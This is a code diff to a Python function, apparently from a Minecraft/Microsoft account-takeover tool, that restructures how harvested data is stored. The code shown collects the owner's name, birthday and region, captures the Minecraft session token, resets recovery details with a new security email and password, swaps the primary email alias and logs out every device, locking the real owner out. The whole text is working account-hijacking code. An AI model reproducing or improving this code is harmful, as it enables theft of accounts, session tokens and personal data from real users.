@@ -48,11 +48,11 @@ async def secure(session: httpx.AsyncClient, recovery: bool, accountInfo: dict):
     if ownerInfo:
         print("[+] - Got Owner Info")
         
-        accountInfo["firstName"] = ownerInfo["Fname"]
-        accountInfo["lastName"] = ownerInfo["Lname"]
-        accountInfo["region"] = ownerInfo["region"]
-        accountInfo["birthday"] = ownerInfo["birthday"]
-        accountInfo["fullName"] = f"{ownerInfo['Fname']} {ownerInfo['Lname']}"
+        accountInfo["microsoft"]["firstName"] = ownerInfo["Fname"]
+        accountInfo["microsoft"]["lastName"] = ownerInfo["Lname"]
+        accountInfo["microsoft"]["region"] = ownerInfo["region"]
+        accountInfo["microsoft"]["birthday"] = ownerInfo["birthday"]
+        accountInfo["microsoft"]["fullName"] = f"{ownerInfo['Fname']} {ownerInfo['Lname']}"
     
     # Minecraft checking
     print("[~] - Checking Minecraft Account")
@@ -73,10 +73,10 @@ async def secure(session: httpx.AsyncClient, recovery: bool, accountInfo: dict):
             capes = await getCapes(ssid)
             if capes:
                 print(f"Capes -> {capes}")
-                accountInfo["capes"] = ", ".join(i["alias"] for i in capes)
+                accountInfo["minecraft"]["capes"] = ", ".join(i["alias"] for i in capes)
                 print(f"[+] - Got capes")
             else:
-                accountInfo["capes"] = "No Capes"
+                accountInfo["minecraft"]["capes"] = "No capes"
 
             # Gets account name
             profile = await getProfile(ssid)
@@ -84,25 +84,25 @@ async def secure(session: httpx.AsyncClient, recovery: bool, accountInfo: dict):
                 print("[x] - Failed to get profile (No Minecraft Java)")
             else:
                 print(f"[+] - Got profile (Has Minecraft Java)")
-                accountInfo["SSID"] = ssid
-                accountInfo["name"] = profile
+                accountInfo["minecraft"]["SSID"] = ssid
+                accountInfo["minecraft"]["name"] = profile
                 
                 usernameInfo = await getUsernameInfo(ssid)
                 if type(usernameInfo) is bool:
-                    accountInfo["usernameInfo"] = "Yes"
+                    accountInfo["minecraft"]["uchange"] = "Yes"
                 else:
-                    accountInfo["usernameInfo"] = f"Changeable in {usernameInfo} days"
+                    accountInfo["minecraft"]["uchange"] = f"Changeable in {usernameInfo} days"
 
             method = await getMethod(ssid)
             if method:
-                accountInfo["method"] = method
+                accountInfo["minecraft"]["method"] = method
                 print(f"[+] - Got purchase method")
         else:
             print("[x] - Failed to get SSID")
 
     else:
         print("[x] - Failed to get XBL (Account has no Xbox Profile)")
-        accountInfo["name"] = "No Minecraft"
+        accountInfo["minecraft"]["name"] = "No Minecraft"
 
     # Security Steps
     await getAMRP(session, T)
@@ -151,9 +151,9 @@ async def secure(session: httpx.AsyncClient, recovery: bool, accountInfo: dict):
             data = await recover(session, mainEmail, recovery_code, security_email, password, email_token) 
 
             if data and data != "invalid":
-                accountInfo["security_email"] = security_email
-                accountInfo["recovery_code"] = data["recovery_code"]
-                accountInfo["password"] = password
+                accountInfo["microsoft"]["security_email"] = security_email
+                accountInfo["microsoft"]["recovery_code"] = data["recovery_code"]
+                accountInfo["microsoft"]["password"] = password
             else:
                 print(f"[X] - Failed to secure this account")
         
@@ -164,25 +164,15 @@ async def secure(session: httpx.AsyncClient, recovery: bool, accountInfo: dict):
         print(f"[+] - Generated Primary Email ({primaryEmail}@outlook.com)")
         info = await changePrimaryAlias(session, primaryEmail, apicanary)
         if info:
-            accountInfo["email"] = f"{primaryEmail}@outlook.com"
+            accountInfo["microsoft"]["email"] = f"{primaryEmail}@outlook.com"
             print(f"[+] - Changed Primary Alias")
         else:
-            accountInfo["email"] = mainEmail
+            accountInfo["microsoft"]["email"] = mainEmail
     else:
-        accountInfo["email"] = mainEmail
+        accountInfo["microsoft"]["email"] = mainEmail
         
     # Logout all devices
     await logoutAll(session, apicanary)
     print("[+] - Account has been secured")
 
     return accountInfo
-
-
-            
-
-    
-
-    
-        
-
-        
